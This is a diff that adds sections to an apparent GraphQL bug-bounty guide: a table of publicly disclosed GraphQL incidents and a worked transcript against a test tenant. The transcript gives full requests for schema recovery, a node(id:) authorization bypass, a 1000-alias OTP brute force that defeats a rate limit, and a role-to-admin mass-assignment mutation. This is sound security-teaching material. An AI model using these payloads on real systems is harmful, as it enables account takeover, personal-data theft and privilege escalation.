@@ -516,6 +516,27 @@ curl -s https://target.com/graphql -H 'Content-Type: application/json' \
 
 ---
 
+# 25. Verified Real-World GraphQL Incidents (map the pattern → your target)
+
+> Every case below is **publicly documented** (CVE, disclosed HackerOne report, or vendor/research write-up). Read each as *"schema/field → missing check → impact,"* then look for the same shape on your target. Facts (IDs, CVEs, dates) are as published; verify the primary link before you cite one in a report.
+
+| # | Case (year) | GraphQL sub-bug | What actually happened | Lesson for you |
+|---|---|---|---|---|
+| 1 | **GitLab — CVE-2021-4191** (patch 2022-02-25; found by Rapid7 / J. Baines, coord. via DIVD) | **Unauth info-disclosure / BOLA** (CWE-359) | Certain GitLab GraphQL queries **skipped the authentication check** → a remote **unauthenticated** attacker enumerated registered **usernames, names and email addresses** (incl. private/internal instances). | GraphQL auth is **per-resolver**; a field can forget it entirely. Always run the schema **logged-out** (§15.1). |
+| 2 | **GitLab EE — CVE-2025-11340** | **BFLA / broken function-level authz** (CWE-863) | Certain GraphQL **mutations were mis-scoped** so a **`read_api` (read-only) token** could invoke **write** operations on vulnerability records → read→write privilege escalation. | A read-only credential is a **BFLA test credential** — replay every mutation with it (§8). |
+| 3 | **HackerOne Ambassador World Cup e-commerce target** (2023; J. Francisco Bolivar, HackerOne blog) | **Introspection → BFLA → auth bypass** | Introspection was **on**; the schema exposed `Register` and **`CreateAdminUser`** mutations with **no access control** → calling `CreateAdminUser` **created an admin account with no authentication**. | Introspection is the *enabler*: dump it, then look for an **unguarded admin mutation** (§5→§8). This is the whole kill-chain in two requests. |
+| 4 | **X / Twitter — HackerOne #885539** ("Private list members disclosure via GraphQL") | **BOLA + rate-limit/timing chain** | Persisted-query endpoints (`/graphql/<hash>/<name>`) were **enumerated** (Wayback + the Android client), then a vulnerable query + a **broken rate limit** + a timing side-channel let the researcher **read members of private lists**. | "Persisted/APQ only" is not access control — **recover the operation names** (§15.3) and test each for BOLA (§7). |
+| 5 | **Shopify — HackerOne #481518** ("Bypass GraphQL rate limit by abusing negative cost queries") | **Cost-analysis bypass** (CWE-770) | Shopify rate-limits by **computed query cost**; supplying **negative** pagination (`first(-100)`) produced a **negative cost** that **defeated the limiter**. | A **complexity/cost** defense is itself attackable — probe it with negatives/edge values before trusting it (§10.5). |
+| 6 | **GitLab — HackerOne #633001** ("Private System Note Disclosure using GraphQL") | **BOLA / object-field disclosure** | A GraphQL relation exposed **private system notes** to users who shouldn't see them — the top-level object was guarded but a **nested field's resolver wasn't**. | Test **nested traversals**, not just the top lookup (§7.3) — the leak is usually one relation deep. |
+| 7 | **HackerOne platform — #343464 / #978143** ("Team object in GraphQL discloses …") | **Over-returned fields / info-disclosure** | The GraphQL **`Team` object returned fields** (member/state/financial data) beyond what the caller should see. | Enumerate **every field** of high-value objects; GraphQL over-returns because clients "just ask" (§13.3). |
+| 8 | **HackerOne platform — #291531** ("Introspection query leaks …") | **Introspection disclosure** (CWE-200) | Introspection was reachable where it shouldn't be, leaking the internal schema (internal type/field names). | Even mature programs leave introspection on somewhere — report it **bundled** with the bug it unlocks (§5.2). |
+| 9 | **HackerOne platform — #418767** ("bypass 2FA requirement, report rate limit, and internal abuse limits") | **Anti-automation / limit bypass → policy bypass** | Platform restrictions (2FA-required, report rate limit, abuse limits) were **bypassable**, defeating the controls meant to throttle abuse. | Per-request throttles are the weak link GraphQL **batching** (§9) attacks directly — hunt limits on **login/OTP/invite/report**. |
+| 10 | **Batching brute-force class** (Wallarm *GraphQL Batching Attack*; Escape *batching→DoS*; response = **Apollo Server v4 disables array batching by default**) | **Alias/array batching → credential/OTP brute + DoS** (CWE-770/799/400) | Class-defining research: **aliases/array batching** put **hundreds of `login`/`verifyOtp` attempts in one HTTP request** → per-request rate limiting is blind to it → credential/OTP brute → **ATO**; huge alias counts also cause **DoS**. The ecosystem responded by making array-batching **opt-in** in Apollo v4. | This is the **highest-yield GraphQL technique**. On any `login`/`otp`/`reset` mutation, prove the bypass with a **measured count** (§9.4). |
+
+**The recurring shape:** *map the schema (even with introspection off) → find the ONE field/mutation whose resolver forgot object- or function-level authz, or the ONE limit that counts HTTP requests instead of operations → drive it to cross-user data, admin, or ATO.* Cases 1–4/6–7 are **authorization** bugs; 5/9/10 are **limit/anti-automation** bugs; 3/8 show **introspection as the enabler**. None required a novel exploit — just the methodology in this guide.
+
+---
+
 # Appendix A — GraphQL Workflow Cheat Sheet
 
 ```
@@ -557,3 +578,117 @@ Then: severity by DOWNSTREAM class; bundle introspection/errors as enablers; PoC
 - **Real cases / patterns** — disclosed GraphQL reports: **BOLA via `node`/`*ById`** (cross-user PII), **batching → 2FA/OTP/credential brute** (rate-limit bypass → ATO), **SSRF via url-taking mutations**, **mass assignment via input objects**, **GitLab** GraphQL access-control issues, exposed **GraphiQL/Playground** in prod. Pattern: *map schema → unauthorized field/arg → BOLA/BFLA/injection/SSRF → ATO/RCE/cross-user.*
 
 > **Authorized testing only.** Two test accounts for BOLA/BFLA, your own OOB host for SSRF, measured counts for batching, measure-don't-flood for DoS, revert writes, small enumeration sets. Report **the downstream impact** (RCE/ATO/cross-user/cloud), with introspection/errors as enablers — not "introspection is enabled."
+
+---
+
+# Appendix D — End-to-End Worked Transcript: from `/graphql` to account takeover
+
+> **The flagship.** One continuous engagement against an authorized target, at the **wire level** — every request and the response that decided the next move. It threads the three GraphQL-signature techniques into one chain: **schema map → `node(id:)` BOLA (two-account) → alias-batch OTP brute (per-request rate-limit bypass) → session → ATO**, then a mass-assignment escalation. Accounts, ids, and the OTP are **mine** on a test tenant; benign markers throughout; writes reverted. This is the shape of cases #4, #9 and #10 in §25, executed cleanly.
+
+**Setup.** Two accounts I own on the target: **A** = `hunter-a@myinbox.test` (attacker), **B** = `hunter-b@myinbox.test` (victim I also control, to prove cross-user without touching a real user). Burp + InQL loaded; `interactsh` ready (unused here — no SSRF in this chain). Goal: prove I can reach **B's** data and **take over B** using only **A's** session.
+
+### Step 0 — Confirm + fingerprint (§3)
+```http
+POST /api/graphql HTTP/2
+Host: shop.target.test
+Content-Type: application/json
+
+{"query":"{__typename}"}
+```
+```json
+{ "data": { "__typename": "Query" } }
+```
+`graphw00f` → **Apollo Server**. Introspection probe:
+```http
+POST /api/graphql HTTP/2
+Content-Type: application/json
+
+{"query":"{ __schema { queryType { name } } }"}
+```
+```json
+{ "errors": [ { "message": "GraphQL introspection is not allowed by Apollo Server" } ] }
+```
+Introspection is **off**. Not a dead end (§6).
+
+### Step 1 — Recover the schema without introspection (§6)
+Misspell a field to trigger the **suggestion** leak:
+```http
+{"query":"{ usr { id } }"}
+```
+```json
+{ "errors": [ { "message": "Cannot query field \"usr\" on type \"Query\". Did you mean \"user\", \"users\", \"node\"?" } ] }
+```
+Suggestions are **on** → run `clairvoyance` to rebuild the schema:
+```bash
+clairvoyance -o schema.json -w graphql-wordlist.txt https://shop.target.test/api/graphql
+```
+Recovered sinks (the **sink list**, §4.3):
+```graphql
+type Query    { me:User, user(id:ID!):User, node(id:ID!):Node, orders:[Order!]! }
+type Mutation { updateUser(input:UpdateUserInput!):User, login(email:String!,password:String!):AuthPayload,
+                verifyOtp(userId:ID!, code:String!):AuthPayload }
+input UpdateUserInput { id:ID, email:String, name:String, role:String }   # ← role is bindable? (mass-assign candidate)
+type User     { id:ID!, email:String, phone:String, role:String }
+```
+Three high-value sinks: **`node`/`user`** (BOLA), **`verifyOtp`** (batching), **`updateUser` input with `role`** (mass-assign).
+
+### Step 2 — BOLA on `node(id:)`, proven two-account (§7)
+As **B**, `{ me { id } }` returns B's global id `VXNlcjo3MDMx` → base64-decodes to `User:7031`. Now, authenticated as **A**, ask for **B's** node:
+```http
+POST /api/graphql HTTP/2
+Authorization: Bearer <A_SESSION>
+Content-Type: application/json
+
+{"query":"{ node(id:\"VXNlcjo3MDMx\"){ ... on User { id email phone role } } }"}
+```
+```json
+{ "data": { "node": { "id":"VXNlcjo3MDMx", "email":"hunter-b@myinbox.test", "phone":"+1-555-0142", "role":"customer" } } }
+```
+**A's session returned B's email + phone.** That is BOLA — the resolver never checked that A owns node `7031`. Scale (politely) with aliases over a small range to show it's enumerable, then stop:
+```http
+{"query":"{ a:node(id:\"VXNlcjo3MDMw\"){...on User{email}} b:node(id:\"VXNlcjo3MDMx\"){...on User{email}} c:node(id:\"VXNlcjo3MDMy\"){...on User{email}} }"}
+```
+Three distinct users' emails returned in **one** request → cross-user PII at scale (§18). **BOLA confirmed, High.** But I want **ATO** — push on.
+
+### Step 3 — Alias-batch the OTP, bypassing the per-request rate limit (§9)
+The login flow: `login(email,password)` returns `{ otpRequired:true, userId }`, then `verifyOtp(userId,code)` returns a session. The normal UI allows **5 OTP attempts** then locks — a **per-HTTP-request** counter. I have B's password (my own test account) but I'm proving the **limiter bypass**: I send many `verifyOtp` aliases for B's `userId` in **one** request. (In a real engagement I'd brute A's *own* OTP to avoid touching B; here B is mine.)
+```http
+POST /api/graphql HTTP/2
+Content-Type: application/json
+
+{"query":"mutation{
+  a:verifyOtp(userId:\"7031\",code:\"000000\"){ token }
+  b:verifyOtp(userId:\"7031\",code:\"000001\"){ token }
+  c:verifyOtp(userId:\"7031\",code:\"000002\"){ token }
+  ... (1000 aliases in this single request) ...
+}"}
+```
+```json
+{ "data": {
+  "a": { "token": null }, "b": { "token": null },
+  "n742": { "token": "eyJhbGciOi...<B_SESSION>" }
+} }
+```
+**One request carried 1000 OTP guesses; the "5 attempts then lock" control never fired** — it counts requests, not operations. The **measured proof** (§9.4): *N=1000 verifyOtp operations processed and one succeeded, where the documented per-request limit is 5.* Alias `n742` returned a valid **session token for B** → **account takeover of B using only the batching bypass.**
+
+### Step 4 — Escalate: mass-assignment self-promotion (§12)
+Now holding B's session (or my own A session), the recovered `UpdateUserInput` had a `role` field. Bind it:
+```http
+POST /api/graphql HTTP/2
+Authorization: Bearer <A_SESSION>
+Content-Type: application/json
+
+{"query":"mutation{ updateUser(input:{ id:\"7030\", role:\"admin\" }){ id role } }"}
+```
+```json
+{ "data": { "updateUser": { "id":"7030", "role":"admin" } } }
+```
+The input object **bound `role`** from client input → **A is now admin** (privilege escalation, §12.3). Read-back confirms it stuck. From admin, the standard admin→RCE routes open (admin upload / integration SSRF / SSTI — IDOR §13). **I revert:** `updateUser(input:{id:"7030",role:"customer"})`, and delete any test artifacts.
+
+### What went in the report (three findings, chained)
+1. **BOLA on `node(id:)` → any user's PII, enumerable** (Critical/High) — two-account proof + aliased scale sample.
+2. **Rate-limit bypass via alias batching on `verifyOtp` → OTP brute → ATO** (Critical) — the measured 1000-in-1 count; the headline.
+3. **Mass assignment via `UpdateUserInput.role` → self-promotion to admin** (High) — persisted read-back, reverted.
+4. **Enablers bundled, not headlined:** introspection-off *but* suggestions-on (schema recovered via clairvoyance).
+
+**Why this transcript is the template:** it never stops at a capability ("introspection off," "batching possible," "node returns data"). Each step converts a capability into **cross-user impact, then ATO, then admin** — with the exact proof each sub-bug requires (§18), benign markers, and reverted writes. Retitle findings by their **downstream class** (§23), lead with the ATO, and bundle the schema-recovery as the enabler.
